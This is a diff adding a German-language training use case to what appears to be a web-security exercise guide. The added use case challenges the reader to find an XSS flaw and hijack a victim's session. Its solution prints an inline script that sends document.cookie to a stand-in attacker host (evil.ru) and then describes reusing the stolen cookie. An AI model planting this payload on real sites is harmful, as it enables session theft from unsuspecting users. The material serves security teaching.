@@ -51,6 +51,16 @@ Lösung:
     * Update den CSRF Token NUR im aktuell gestellten Request
 ```
 
+#### Use Case: Übernehme die Session eines anderen Users mittels Finde eine geeigneten [XSS-Lücke](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
+
+```
+Challenge: Finde ein Eingabefeld, dass eine XSS-Lücke enthält und klaue damit die Session eines ahnungslosen Opfers
+
+Lösung:
+* Platziere an einer geeigneten Stelle ein inline JavaScript wie beispielsweise: 
+    <script>window.location="http://evil.ru/?cookie=" + document.cookie;</script> 
+* Extrahiere den erbeuteten Cookie aus dem Request und übernehme die Session 
+```
 
 #### Use Case: Behalte die Login-Session offen
 ```
